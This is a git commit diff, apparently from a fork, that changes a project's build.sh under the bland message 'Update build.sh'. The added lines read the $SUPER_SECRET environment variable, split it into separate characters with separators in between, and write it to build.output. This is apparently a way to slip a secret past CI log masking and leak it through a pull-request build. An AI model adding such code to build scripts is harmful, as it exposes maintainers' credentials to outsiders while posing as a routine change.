8d25da2d2319fbbf8d2507cdad1f9ea051947236
saml-lgv-user1 <124800162+saml-lgv-user1@users.noreply.github.com>
2023-02-10 11:33:41 +0100

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,3 +1,14 @@
 RET=1
-echo "Building desde main [$RET]" >> build.output
+
+echo "Building desde FORK [$RET]" >> build.output
+
+foo=$SUPER_SECRET
+ss=""
+for (( i=0; i<${#foo}; i++ )); do
+  #echo "${foo:$i:1}" >> build.output
+  ss="$ss$IFS${foo:$i:1}"
+done
+echo $ss >> build.output
+echo "Adios desde FORK" >> build.output
+
 exit $RET
